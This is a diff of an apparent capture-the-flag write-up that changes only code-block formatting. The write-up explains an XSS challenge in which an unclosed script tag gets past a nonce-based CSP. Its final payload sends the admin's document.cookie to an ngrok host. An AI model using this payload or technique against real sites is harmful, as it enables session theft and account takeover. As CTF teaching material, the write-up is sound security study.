@@ -22,7 +22,7 @@ These parameters are "sanitized":
 If everything goes well, you are redirected to /share/:shareName, where shareName is the hex representation of an 8-bytes UUID.
 The resulting page is built like that:
 
-```
+{% highlight html %}
 <!DOCTYPE html>
 <html>
 	<head>
@@ -48,7 +48,7 @@ The resulting page is built like that:
 		
 	</body>
 </html>
-``` 
+{% endhighlight %}
 
 You may have noticed the following variables: nonce, extra, score, name.
 - "Score" and "name" were provided with the POST request to /record.
@@ -56,7 +56,7 @@ You may have noticed the following variables: nonce, extra, score, name.
 - "Extra" contains the flag if you made the request with admin's cookie.
 This cookie is used by a "visiter" when you call /report/:shareName with a POST request, in fact that endpoint calls visit function.
 
-``` 
+{% highlight javascript %}
 app.post('/report/:shareName', async function(req, res) {
 	if (!(req.params.shareName in shares)) {
 		return res.status(400).send('hey that share doesn\'t exist... are you a time traveller :O');
@@ -67,11 +67,11 @@ app.post('/report/:shareName', async function(req, res) {
 		`http://localhost:9999/shares/${req.params.shareName}`
 	);
 })
-```
+{% endhighlight %}
 
 Visiter code:
 
-```
+{% highlight javascript %}
 async function visit(secret, url) {
 	const browser = await puppeteer.launch({ args: ['--no-sandbox'], product: 'firefox' })
 	var page = await browser.newPage()
@@ -88,7 +88,7 @@ async function visit(secret, url) {
 	await page.close()
 	await browser.close()
 }
-```
+{% endhighlight %}
 
 It's clear that our goal is to exploit an XSS vulnerability in order to get admin's cookie, and then to use that cookie to get the flag.
 Let's try to do it using "name" parameter.
@@ -100,24 +100,24 @@ We tried many things, testing them locally first, but browser's security mechani
  
 At last, we realized that in the resulting page there was no HTML between our user-provided name and the script tag with the nonce, so we tried with this payload:
 
-```
+{% highlight html %}
 <script src="data:, alert(1);"
-```
+{% endhighlight %}
 
 Without closing script tag, as you can see. In the resulting page:
 
-```
+{% highlight html %}
 <script src="data:, alert(1);"
 <script nonce='${nonce}'>
-```
+{% endhighlight %}
 
 And in fact it gets executed; notice that this vulnerability is not about a misconfiguration of the CSP, but it is about the poor structure of the HTML doc.
 At this point, we can inject an inline script, with an upper bound of 100 characters.
 The idea is to send the cookie to webhook, but webhook.site's URL is too long, so we'll set-up ngrok and use the following payload:
 
-```
+{% highlight html %}
 <script src="data:, location.replace('http://[redacted: 12 chars].ngrok.io/?d=' + document.cookie);"
-```
+{% endhighlight %}
 
 We finally got the cookie:
 
